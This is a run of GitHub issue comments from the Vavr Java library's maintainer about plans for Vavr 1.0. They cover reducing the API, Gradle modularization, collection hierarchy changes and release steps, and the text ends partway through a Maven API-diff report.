formatter.apply(FlowStepKind.OTHER));\n\n}\n\n}\n```\n\nI will close this ticket for now (unless you find an example that uncovers a bug).\nThanks for reporting!. Hi Yaroslav,\nthank you for your suggestion, I\u2018ve also thought about it.\nAs you may have read already on our blog, we want to reduce our API surface area (for several reasons).\nNamely, we will remove redundant verbs.\nTry.withResources will be replaced by using Java\u2018s try with resources directly:\njava\nTry.run(() -> {\n    try (var conn = DriverManager.getConnection(\"\")) {\n        System.out.println(\"Ok\");\n    }\n});\nYou see, it is all there already. We are able to\n\nremove N types Try.WithResources1..N\nremove N methods Try.withResources\nwe use native Java where possible, instead of introducing redundant proprietary API\nwe completely remove the dependency of Try to CheckedFunction1..N\n\nTherefore I will close this issue.\nThanks again!\n. @yarulan I understand your point.\n\nLibraries' purpose is to make life easier for the users\n\nIt is an unequal trade: a bit syntactic sugar for performance overhead:\njava\nTry.withResources(() -> DriverManager.getConnection(\"\")).run(conn -> System.out.println(\"Ok\"));\n\n1 new TryWithResources1 class instance\n1 lambda instance () -> DriverManager.getConnection(\"\") stored in 1 instance variable\n1 new Try instance by calling run\n1 new lambda instance conn -> System.out.println(\"Ok\")\n\nNow imagine we pass 8 resource suppliers. Then we have\n\n1 new TryWithResources8 class instance\n8 lambda instances () -> ... stored in 8 instance variables\n1 new Try instance by calling run\n1 new lambda instance (r1, ..., r8) -> System.out.println(\"Ok\")\n\n= n + 3 instances = O(n)\nThis does not scale well.\nIf we use Try.run(\\) we have only 2 instances = O(1). It is my responsibility to get this right.\n\nRegarding the lines of code, you are exaggerating a bit...\njava\nTry.withResources(() -> resource1, () -> resource2, () -> resource3)\n    .run((r1, r2, r3) -> {\n        // n lines of code here\n    });\nvs.\njava\nTry.run(() -> {\n    try (var r1 = resource1; var r2 = resource2, var r3 = resource3) {\n        // n lines of code here\n    }\n});\n\n\nP.S. I have another proposition: remove collections from vavr.\n\nIt took a great amount of time for me to get clear, take the step and reduce the API surface of Vavr. Please don't understand me wrong, humans are fear-driven - they are collectors and don't want to loose s.th. If I'm able to get beyond that, there is lots of space for new things. It took nearly 40 years until I got that.\nPlease take a look at the comparison between Scala's Try, Vavr's Try and Java's Optional (which is very similar to Try). We should not try to be more clever than the language/native library architects.\n\nReducing the API surface area is not only good for me (as maintainer). It also makes learning of the API easier.\n\nYou have to trust me - it is the best solution I can imagine.\n. @yarulan thank you, also for using Vavr. We will make it better \u2014 step by step.... Hi @CauchyPeano, thanks for applying the changes!\nWe will move to Gradle in baby steps.\nFirst the control package, second the collection package, then API + annotations + processor. So there is no hurry.\nThe project is too complex in order to do it in a \u201abig bang\u2018. Complexity can be handled best by slicing things into smaller, simple parts. Namely: modules.. Many thanks!. Hi, thanks for the suggestion.\nI think in your first example, the collect call is unnecessary:\njava\nEither<Object, Seq<String>> result = Either.sequenceRight(Stream.of(1, 2, 3)\n      .map(i -> Either.right(\"Some result\"))\n      .collect(io.vavr.collection.List.collector()));\nStream is already a Seq, so we do not need to convert it to a List.\nThe following is the same, am I right?\njava\nEither<Object, Seq<String>> result = Either.sequenceRight(Stream.of(1, 2, 3)\n      .map(i -> Either.right(\"Some result\")));\nAlso, Either is right biased. An Either.collect would be sufficient. If left values need to be collected, a map(Either::swap) could be made.\nHowever, currently I'm modularizing Vavr 1.0. The vavr-control module will have no dependency on vavr-collection, especially Either will not know about Seq anymore. This implies that I have to remove the sequence methods from the vavr-control module.\nI plan to move the sequence methods to the vavr-api module. Namely we will have something similar to this:\n```java\nimport static io.vavr.api.API.*;\n// of type Either>\nsequenceEither(\n    Stream.of(1, 2, 3).map(i -> Either.right(\"Some result\"))\n);\n```\nwhere\njava\nclass API {\n    static <L, R> Either<L, Seq<R>> sequenceEither(Iterable<? extends Either<? extends L, ? extends R> xs) { ... }\n    static <T> Try<Seq<T>> sequenceTry(Iterable<? extends Try<? extends T>> xs) { ... }\n    // ...\n}\nThis is already on my radar, so I will close this issue.. Yes, this is a limitation of Java\u2018s type system. I tried to model it the same as in Scala, but simply spoken: it is not possible in Java.\nPlease take a look at this signature:\njava\nabstract class Eithet<L, R> {\n    <T extends Either<L, U> & R, U> Either<L, U> sequence() { ... }\n}\nBut Java can\u2018t express such intersection types. (Note to myself: I will try to do that in TypeScript \ud83d\ude05)\nOther examples are flatten() on collections and so on. The only possibility to bring the types into the correct context is using static methods. Unfortunately.. Thanks!\nIn Vavr 1.0 we will add a collect(Collector) method to our collections. But we will not add specific collector implementations. collect is only an interoperability point towards native Java.\nThe Vavr way of flattening would be to add static methods to the collections:\njava\n// = List(1, 2, 3)\nList.flatten(List(List(1, 2), List(3)));\nor more general:\njava\n// informally\nList.flatten(<Iterable<Iterable<T>>>)\nthen it can be also used with Option, Either, ...\n. Hi @chefhoobajoob,\nVavr is aligned to Scala. We distinguish between reduce (without seed / zero) and fold (with seed / zero): http://static.javadoc.io/io.vavr/vavr/0.9.2/io/vavr/collection/Foldable.html\nI hope that helps?\nNote: We have a Gitter Chat for questions\n. Thanks! \ud83d\ude09. Yes, this makes sense. I think the scala3 collections hierarchy will be simplified. Ours will be simplified, too. I will have an eye on it.\nI will close this issue because it is more a guideline than having formal acceptance criteria.. Hi @jorgepelizzoni, thank you for the kind words.\nIt is a known issue that Comparators are not used consistently on sorted collections, see #1226 and #1391.\nVar 0.9.x can't be fixed in a backward-compatible way, it would break existing applications.\nSo I will defer the Comparator-related changes to Vavr 1.0.\nI will close this issue as duplicate.\n\nA few notes regarding your suggestion: Instead of adding new methods, we will update the API docs of max() (by stating a different behavior, depending of the collection type). Generally, we will remove most default method implementations on interfaces and move them into the concrete classes. This is because we do not want to implicitly depend on specific implementation types within our interfaces. That is a fragile construct. For example users could decide to implement their own collection based on Vavr interfaces, that uses an internal Comparator but does not implement Ordered. Then things would start to go terribly wrong.\nThanks again!. @jorgepelizzoni I will double-check the behavior when comparing it to Scala collections.. @SimY4 Thank you!\n\nIf I understand you correctly you want to set vscUrl for each module independently.\n\nThe modules depend on each other, so it makes sense to have one Gradle build for all projects.\nWhen I release Vavr, I want to baseline all modules, i.e. when we release Vavr 1.0, we have\n\nvavr-control-1.0.0.jar\nvavr-collection-1.0.0.jar\n...\n\nThe tricky part is that a jar is created for each submodule but all modules refer to the same Github repository. A module is a subdirectory within one repository.\nIf the vcsUrl is needed for tagging a release, I want to have one vcsUrl for all projects.\nThe parent-pom of our previous Maven build worked like that. However, Gradle submodules work a bit different. There isn't a parent module anymore. I don't know how to handle that in Gradle.\nAlso I'm not sure how to automatically increase version numbers / snapshot versions etc.\n. @SimY4 thanks for the input, that is really helpful!. @yuriykulikov Thanks for the input! I think I will do the deployment this weekend. It would be great if you could take a look later (after your vacation) if it makes sense to you what I've done then.... I will try the following Gradle plugin: net.researchgate.release\nBeside other scenarios, it explicitly supports releasing a multi project having a single version)\nThere exists a hook uploadArchives for additional release steps (like uploading artefacts to Bintray).. It does work on the new master branch (that contains v1.0.0).. The idiomatic way would be s.th. like (I've not tested it):\njava\npublic Try<Void> put(byte[] key, byte[] value) {\n    ...\n    return Try.run(() -> {\n        try {\n            if (!isDbOpen) throw new IOException(\"RocksDB is closed.\");\n            db.put(key, value);\n        } finally {\n            stateChangeLock.readLock().unlock();\n        }\n    });\n}\nNote: the try {} block is only needed because of finally.... Vavr has already Traversable.nonEmpty() which is aligned to Scala's Traversable.nonEmpty.. Thanks for your suggestion!\nIt is too easy to oversee some hidden side-effects regarding the collection type-hierarchy when adding new features that do not exist in other collection libraries, yet.\nAlso, our strategy for Vavr 1.0 is to reduce the API surface area. We should not provide syntactic sugar for special use-cases that can easily be achieved by compose existing API endpoints.\nI will align the Vavr 1.0 collection API to Scala's new collection API. In a first step, we perform a cleanup instead of adding new features. Therefore I will close this issue for now.\nI hope you understand.. Hi @CauchyPeano, please see my issue comment.\nThx for your effort!\nI will update all other issues in order to reflect the Vavr 1.0.0 strategy.. Hi @CauchyPeano,\nlocally I have set up the second module for v1.0, vavr-collection. It would be best to focus on that (instead of modifying the existing v0.9.x branch).\nMore concrete: I need to finish the collection type hierarchy in form of interfaces. It should be more or less the same we already have in Vavr 0.9.2 but with some important changes (Traversable will be renamed to Iterable, Iterator does not implement Iterable anymore - and maybe Map<K, V> will implement Iterable<V> instead of Iterable<Tuple2<K, V>>). More on that soon.\nWhen we have that, the real work begin - migrating the existing collection implementations to that new structure. I will come back to you when the collection interfaces are ready to start the migration. I plan to be ready this weekend.\nThanks! Looking forward to work with you on Vavr 'next generation' :-)\n- Daniel. ## Conversion\nAt the root of the type hierarchy there was Value, which had all the conversion methods (not only for collections). Starting with Vavr 1.0, instead each modules has intra-module conversion methods. This fixes issues like:\njava\n// = Some(1)\nList(1, 2, 3).toOption()\nHaving one conversion method for each collection does not scale very well. What if user-defined collections are added. The solution for this problem is a generic conversion method:\n```java\npublic interface Iterable extends java.lang.Iterable {\n@Override\nIterator<T> iterator();\n\ndefault <U, C extends Iterable<U>> C to(Function<Iterable<T>, C> fromIterable) {\n    return fromIterable.apply(this);\n}\n\n}\n```\nBefore:\n\nlist.toSet()\nlist.toMap(keyExtractor, valueExtractor)\n\nAfter:\n\nlist.to(Set::ofAll)\nlist.to(Map.ofAll(keyExtractor, ValueExctractor))\n\nwith\n```java\ninterface Set extends Iterable {\n    static  Set ofAll(Iterable<? extends T> iterable) { ... }\n}\ninterface Map extends Iterable {\n    static  Function, Map> ofAll(Function keyMapper, Function valueMapper) { ... }\n}\n```\n\nTypes...\n```java\nvoid test(List list) {\nIterable<CharSequence> ccc1 = list.to(Set::ofAll);\nIterable<String>       ccc2 = list.to(Set::ofAll);\nList<CharSequence>     ccc3 = list.to(Set::ofAll);\nList<String>           ccc4 = list.to(Set::ofAll);\n\n// = Map.ofAll(s -> s, String::length).apply(list);\nMap<String, Integer>    map = list.to(Map.ofAll(s -> s, String::length));\n\n}\n``. @nfekete I know you don't like a genericto(...)conversion method. But explicitly enumerating all possible conversion methods has drawbacks and does not scale well. The solution described above does not simulate HKT's. It is just a compositional approach using functions. It aligns to the Scala 2.13 collection rework. Vavr's.ofAllfactory method is calledfromIterablein Scala. If only we could express on the type level that a typeClass` has a specific static method...\nI want to sperarate the frequently used collections (Sets, Maps, Seqs) and the more esoteric and less used collections (BitSet, PriorityQueue, MultiMap, MultiSet) into different Jigsaw modules. However, we still want to be able to convert collections across Jigsaw modules. That will be only possible with a generic conversion method.\n(Scala's collections do not have a tranform method, Vavr 1.0 also won't have it.\nBtw - Vavr's {Option, Either, Try}.transform(...) aligned to Scala in Vavr 1.0.)\nWe need the split and the simplifications because Vavr suffered from the second-system effect within the last 4 years.... Yeah, I know. I was involved when the KindedJ Github org was founded. (In fact I'm an admin of that org.)\nHowever, that's not the right direction for Vavr. HKTs are needed by the projects you mentioned in order to lift functions to a level that operates on Monads. HKTs are a dirty workaround in Java, they have limitations (e.g. only one inheritance level configurable). Such algebraic abstractions are completely out of scope for Vavr. We strive for a dead-simple (but powerful) library for 'Avarage Java Joe' that hides away explicit abstractions like Functor, Monad, Monoid, Applicative, Lense, etc.. @emmanueltouzery to is shorter and also present in Scala. transform will disappear. We align to Scala in the first place (and when in doubt). We could introduce the 0.9.2 methods for backcompat and deprecate them. But I would prefer to remove them.. @emmanueltouzery you (and @nfekete) are right! We can widen the codomain of to:\njava\ndefault <C> C to(Function<Iterable<T>, C> fromIterable) {\n    return fromIterable.apply(this);\n}. @nfekete That's right. A transformation is just a function. When removing transform we loose the fluent API.\nIn a first step I will take a look at the existing Scala collections API. It is pretty mature. Afterwards I think about what to do additionally.... @nfekete, @emmanueltouzery I also think both, to() and transform(), are helpful. We will implement both in Vavr 1.0.\nAlso I've thought much about modularity. The first module was a test-balloon. I care about you and existing code-bases. The more I think about modularization and the benefits of the current Vavr 0.9.x monolith, the more I think I need to keep the main functionality of Vavr in one module.\nI will prepare a suggestion that preserves most of the existing functionality.. ## Type Hierarchy\n\nWe will have the following implementations:\n\nHashSet and HashMap (probably based on CHAMP as in Scala 2.13, not on HAMT)\nTreeSet and TreeMap\nQueue, List and LazyList (LazyList has also a lazy head and will replace Stream)\nArray, Vector\n\nAll other collections will go to an 'extended collections' module. ## Serializability\n\ncollection interfaces will not extend Serializable\ncollection classes will extends Serializable (and are probably final)\n\nWe need to take care of casting Comparators of sorted collections to (Comparator & Serializable).. Thank you @tlinkowski, that is really helpful. I tweeted your lovely blog post link: https://twitter.com/danieldietrich/status/1083362477147127810\nI will experiment with it!. Thx. @hepin1989 does not make sense because int targets the array index. There is no use-case for other types regarding toArray conversion.... Already fixed. @nfekete for me it is ok to ignore deprecation warnings on the class level, but only in src/test (in order to fix the build). We should not switch off this compiler warning in the pom.. That sounds good!. Thank you, N\u00e1ndor!. In Vavr 1.0 you would use a transform() for that purpose:\njava\nobj.transform(this::trySthElse, r -> obj);\nI know that the r -> obj part could be seen as noise but we want to reduce the API surface area. It is not worth the effort to provide syntactic sugar for a special case.. Btw, thank you for your suggestion :)). @jlorenzen yes, 1.0 will include many backw.incompat. changes. It is more tightly aligned to the upcoming Scala 2.13.\nCurrently I see no reason not to backport some of the changes - selectively. We should keep 0.x backw. compatible.. Interfaces can be implemented by everyone, therefore it is a security hole. Option, Try etc only have two implementations (Some/None, Success/Failure etc). Because Java does not have sealed interfaces, we can only use an abstract class to hide the constructor. Alternatively we could have used a final class without inheritance (like Java\u2018s Optional).. Allowing only specific implementations is essential when it comes to pattern matching. Otherwise the compiler could not guarantee exhaustive checks. (Look at Scala)\njava\n// a future Java switch expression\nvar res = switch myOption {\n  case Some(t) -> doSomeThingWith(t)\n  case None -> doSthElse()\n  // no other case possible if Option is sealed!\n}\n```java\n// can't guarantee that there are \ninterface Option {\n    static class Some implements Option {}\n    static class None implements Option {}\n}\n// only two impls possible!\nabstract class Option {\n    private Option() {} // sealed!\n    static class Some extends Option {}\n    static class None extends Option {}\n```\n. Thank you all for your input, it is very valuable to me. I distilled it:\n\nWe will preserve backw.compat to Java 8\nWe will change the package name to io.vavr.core in order to have a unique module name but we will also stay on the classpath\nWe will remove Value and Tuple and keep Tuple1..N. Especially we will not introduce Map.Entry (/cc @emmanueltouzery )\nThe core will contain an uncluttered vavr (tuples, functions, controls, collections - and maybe concurrent.Future. In Scala concurrent will be an own module)\nI will increase safety (e.g. reduce will not throw anymore, numeric operations might be removed or kept safe)\nAll types will be at least java.lang.Iterable (collections will be io.vavr.core.collection.Iterable) but all iterator() methods will return a 'rich' Vavr Iterator\n\nI also thought about wrapping CompletableFuture in a Scala-like Future but I'm not sure, yet. I think our current approach might be fine for now.. @emmanueltouzery / @nfekete / ...\nDo you use Function1..N and/or Tuple1..N?. @nfekete scala.collection.Iterable is different, it is at the top of the collection hierarchy. With Scala 2.13, Traversable will be deprecated and finally removed in Scala 2.14.\nio.vavr.core.collection.Iterable currently is very much like Scala's scala.collection.Iterable. It has too many methods for Option, Try and Either. But I see the need for an interface at the top of the Vavr hierarchy, that has a rich iterator().\nInstead of re-introducing the Value interface, we could in fact move a simplified version of Iterable (and the rich version of Iterator) to io.vavr.core. Additionally we would add a Java-like Collection interface to the top of the io.vavr.core.collection hierarchy. It would be a replacement for Vavr's Traversable resp. rich Iterable.\nThen Vavr would look more like Java. \ud83d\ude05. @nfekete \n\nI'm wondering about the usefulness of the map/flatMap methods. Do you have a use-case?\n\nThe current code base just contains example code. Iterable will soon look more like this, having 20-50 methods (not only map & flatMap).\nPlease don't confuse Vavr's current Iterable with Java's. It is a collection interface (in Scala and currently in Vavr). The collections in Scala always flatMap to Iterable. In fact this relaxes the Monad laws a bit but it is still okay. It also works well in Java/Vavr.\nYou have in mind that Iterable will be used not only by collections. This is what I meant with\n\n(...) a simplified version of Iterable (...)\n\nin the comment above. If we move Iterable to io.vavr.core, it will only have the iterator() method. map() and flatMap() will disappear. io.vavr.core.collection.Iterable will be renamed to io.vavr.core.collection.Collection. That one will have map() and flatMap().\nNote: Our Traversable currently has flatMap(Function<T, Iterable<U>), which works well for collections.\nNote 2: Iterable is the new Traversable in Scala 2.13.. Hi @asarkar,\nthanks you for your feedback - here are my thoughts.\n\nbut you can start by adding an Automatic-Module-Name attribute the MANIFEST.MF\n\nThanks for your suggestion! We already do that in both, the current v0.9.2 and the upcoming v1.0.0.\nI've experimented much with JPMS (in Maven and Gradle).\n\nThe official recommendation is to name the module root directories the same as the modules, but you're not doing that.\n\nYou read different things. I also stumbled across these docs. It is just a convention that has no effect regarding the builds. Some do it, some not. It does not matter.\n\nFor one thing, and I'm speaking from experience, having a build.gradle in every module creates code duplication, and makes it very difficult to see the big picture at once.\n\nThat's right. I started with one Gradle file. But Gradle's current ext.moduleName workaround for the Automatic-Module-Name approach requires each submodule to have a separate build.gradle.\n\nNevertheless, the link to the JPMS I gave you (in the Gradle issue on Github) is an old commit. The current version on the v1.0.0 branch does not have build.gralde files anymore in the submodules: https://github.com/vavr-io/vavr\nThx!. @asarkar \n\nI suppose that's because your Gradle module names are not the same as the JPMS module names, hence you need a property.\n\nI see! That's nice, thank you for the hint!. @jbduncan Vavr is relatively small. All the past discussion showed that people are more willing to include just one lib (and maybe do not use parts of it) instead of having the overhead of including several libs. It complicates things.\nAlso, we need to throw away existing features (like Try.sequence) when shipping control as separate module.\nTherefore my current strategy is to keep things backward compatible if possible (like package structure, naming etc) and just fix wrong design decisions in order to get Vavr right (like type hierarchy etc).. Thanks. Hi gents,\nI think I need to switch branches again in order to make contribution possible.\nThe current v0.9.x needs to be master, the current master needs to be master.\nSorry for the inconvenience, will fix that until this evening.. Done, please try it again, @1304julian . Hi @skestle,\nsorry for the late answer.\nWe can add it to master (v0.9.x).v1.0 is still in the design stage.. Multimap will probably not part of Vavr 1. We want to focus on the most frequently used collections. Maybe we will release some kind of add-on collections package later.. Oh noes...\nVery few users had that issue and we invested some hours to understand it but where not able to fix it.\nIt works on our continuous integration servers (Travis-CI/Ubuntu) and on our local machines.\nMaybe it has s.th. to do with the Scala version (see Maven poms), maybe additionally with the combination of JDK and OS. I don't know :-/. @jbrains please try also Java 8 if you have it at hand. Our CI builds run on JDK 8 & 9.. @jbrains \ud83d\udd25-W-O-W-\ud83d\udd25\nthank you!\ud83d\udc4c\ud83c\udffc\ud83d\ude03. Awesome!. Thx!. Great!\nMany thanks for your effort and the detailed description & scripts!. Thank you! I will wait for your signal when the PR is final/ready.\nI don't know were the 'generic' reduction methods like sum will go. I promised to make Vavr 1.0 safer in that regard.... Hi J.B.!\nit seems I totally missed the purpose of your PR. When you added the PR, I only looked at the code changes and it seemed to me that you wanted to add only some changes to the src/test/java part.\nI'm afraid, we will not add algebraic abstractions like Monoid (or Functor, Monad, Applicative, Kleisli, ...) to Vavr. In fact I did it myself in the early days of Vavr (formerly Javaslang). Where to start, where to stop?\nI soon recognized, that Java is not the right language for such algebraic extensions. In order to define Monad.flatMap, higher kinded types (HKTs) are helpful. However, HKT's can't be expressed with Java's type system.\nTo that time the overall strategy for Vavr emerged - aligning tightly to Scala. Scala itself does not contain algebraic extensions. For example, a concrete class like String or List should not extend the Monoid interface because the Monoid property is not unique. There are many possibilities to define the 'combine' operation. It could be (but not necessarily have the be) concatenation for example.\nHaving algebraic abstractions means, to express programs on that level. The code will operate (read: be lifted) on Monoids, Functors, Monads etc. Then, it does not matter if we operate on Lists or Strings or whatever. It can be easily formally proved that the code will be correct, if the corresponding types obey the algebraic abstractions mentioned above.\nI do not want to push Vavr in that direction. It is too abstract for (literally spoken) 99% of the Java users. The remaining 1% will most probably not chose Java, because it is too restrictive/not able to express algebraic thoughts in an appropriate way.\nGiven that, the introduction of Monoid et al look more like a playground or proof of concept instead of covering real-world use cases. I fully understand your interest in that topic. I also played around with it. But it is far from being a practical approach in Java.\nI'm not the only one who thinks that way. Most original committers of \"Functional Java\" turned away from their Java repository. Many of them also have roots in the Scalaz project, which is exactly that: algebraic structures for Scala. But as I said, in Java it does not make much sense. Soon we are confronted with shortcomings of Java.\nI hope you understand that I have to close the PR.\nI want to apologize because I did not recognize the direction of this PR (and that there does not exist a readme, yet, that reflects our overall strategy).\n- Daniel. > Perhaps it works better for sum() to be a literal alias for foldLeft().\nI think that users should learn about fold / reduce. These are the most important methods of our collections. Nearly all other operations can be expressed based on them.\nThe main problem is that sum() (without arguments) is unsafe. It will disappear in Vavr 1.0.\n```java\n// safe\nList(1, 2, 3).fold(0, (a, b) -> a + b);\n// unsafe\nList(\"a\", \"b\", \"c\").sum();\n```\nIf Java would support tuples as first class citizens it would be straight forward:\n```java\n// = Tuple2>\nvar IntSum = (0, (a, b) -> a + b);\n// fold takes 2 arguments, which is effectively a Tuple2\nvar sum = List(1, 2, 3).fold(IntSum);\n```\n\nThat is why I asked for feedback before going too far.\n\nYes, that's my bad. I owe you a \u2615\ufe0f (or two)\n\nI have the urge to try to contribute to this code base in the future, I now know how to do it\n\nI'm looking forward to it :). One more thought: We avoid introducing aliases in favor of keeping the API surface area small. It is a strategic decision because of simplicity (user perspective) and maintainability (maintainer perspective).. Hi @galegofer,\nthe reason is that there is no Vavr API that makes use of these interfaces.\nI would suggest to define your own interfaces, especially if you need to expose them as part of a public API (high cohesion & under own control).\nThe main idea is that a BiConsumer<T, U> is the same as a Function<T, U, void>.\nI hope that Java will eventually allow primitive generics.. Vavr will not support CheckedConsumers.\nI think this is a dead end. When we have primitive generics, a CheckedConsumerN might be expressed like this:\njava\nCheckedFunctionN<any T1, ..., any Tn, void>\n. @galegofer, please find my thoughts about Vavr support here: http://blog.vavr.io/vavr-support-roadmap/\nIn Java there will be primitive generics\nFunction<T, void>\nwhich would make CheckedConsumers obsolete. I suggest to write your own FIs for that purpose, they are each only 3 LOC.. Hi, thanks for your suggestion.\nDoing it for Vavr 0.9 (resp. 0.x) is out of scope.\nOn the Vavr 1.0 branch we are already on JUnit 5.\nTherefore I will close this issue.. Thanks for the suggestion.\nMoving things around might be 'foolish consistency'. It will break code out there.\nThe only benefit is grouping things that belong together - we already do that!\nIs it worth to break existing applications? (I don't think so)\nWhen will Scala move Try and Either?. The difference between Vavr and Scala is that scala have different packages for Option, Either and Try (scala and scala.util) and we have one package (io.vavr.control).\nDo you think it is worth to break backeard compatibility, by moving Option, Try and Either to io.vavr?\nI agree that these are our most basic types.. Moving them from io.vavr.control to io.vavr will lock us forever from shipping controls as a separate module.\nI will think about it. It is not the most important task for now. I will focus on the collection interfaces next. We will decide it until 1.0 final.. Thx! I will prepare an alpha-2 release this day.. Hi, just wanted to give you an update.\nI polished the alpha-2 a bit and wanted to release it. However, I'm stuck with the net.researchgate.release plugin for Gradle. Version 2.7.0 does not allow me to perform a release based on a non-master git branch. It seems to be solved in 2.8.0, but it isn't released, yet.\nSee also researchgate/gradle-release#195. Finally done.\nIt was already released on Bintray JCenter but I had several issues syncing the release to Maven Central. So I changed the Gradle build and release now directly to Sonatype.\nFor the users, this is transparent, because Maven Central is automatically synced to JCenter.\nNote: It may take a few hours until vavr-1.0.0-alpha-2 is visible on Maven Central. The release notes will follow today here on Github.. @yvolk Great to hear!\nYes, the name change was intended and has to do with the rollback of Jigsaw modules.\nVavr 1.0 will stay to be one module for\n\nio.vavr\nio.vavr.collection\nio.vavr.concurrent\nio.vavr.control\n\nI will update the README. Thanks for the hint!. Please try to use a different/newer Maven Version. Please see #2269 \nDoes that work for you?. Please ask the question in our Gitter chat! We can't answer general questions here.\n(You may reference this issue in order to save some keystrokes...)\nThx!. Hi Sven,\nI hope you are doing well!\nI think this issue has to do with a combination of\n\nJava version\nMaven version\nMaven Scala Maven Plugin version\n\nWe give a hint in our CONTRIBUTION.md (but it is not obvious).\n@jbrains gave a great overview in the issue #2321. Interestingly, he had no successful build with Java 8 at all. On my machine (macOS Mojava ) the build runs with all JDKs (8, 9, 10, 11) and Maven 3.5.4.\nHow could this be solved in Gitpod?\n. Yes, I will update the readme. What puzzles me is that it works with Java 8 in other environments. I have the impression, that the issue still isn't understood fully.\nHowever, starting with Vavr 1.0 (which is in the make), we switch from Maven to Gradle. Then the issue will disappear.... ## Analysis of API changes\nVavr 0.10.0 will contain the following changes:\n* (!) Collections do not extend (Partial)Function anymore. See PR #2267\n* Fixed return types of some SortedMap methods to return SortedMap instead of Map\n  - put(Tuple2, BiFunction)\n  - put(Object, Object, BiFunction)\n  - replace(Object, Object, Object)\n  - replaceAll(BiFunction)\n  - replaceValue(Object, Object)\n* Widened Future arguments from ExecutorService to Executor\n* Widened return type of HashMap.values() (before: Stream, after: Seq)\n* Removed internal class Lambda from the (Checked)Function type hierarchy. It broke Scala apps, see #2337\n* Some internal classes of the auxiliary types changed (should no matter)\nFull report:\n\n\n```\n[INFO] Comparing bundle vavr version 0.10.0-SNAPSHOT to version 0.9.3\n[INFO] \n[INFO]   PACKAGE_NAME                                       DELTA      CUR_VER    BASE_VER   REC_VER    WARNINGS  \n[INFO] = ================================================== ========== ========== ========== ========== ==========\n[INFO] > io.vavr                                            major      0.10.0     0.9.3      1.0.0      Version increase required\n[INFO]      > class io.vavr.API\n[INFO]          + method For(io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7List\n[INFO]          + method For(io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List,io.vavr.collection.List)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8List\n[INFO]          + method For(io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7Future\n[INFO]          + method For(io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future,io.vavr.concurrent.Future)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8Future\n[INFO]          + method For(io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For2Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For3Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For4Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For5Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For6Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For7Option\n[INFO]          + method For(io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option,io.vavr.control.Option)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For8Option\n[INFO]          + method For(io.vavr.control.Try)\n[INFO]              + access static\n[INFO]              + return io.vavr.API$For1Try\n[INFO]          + method 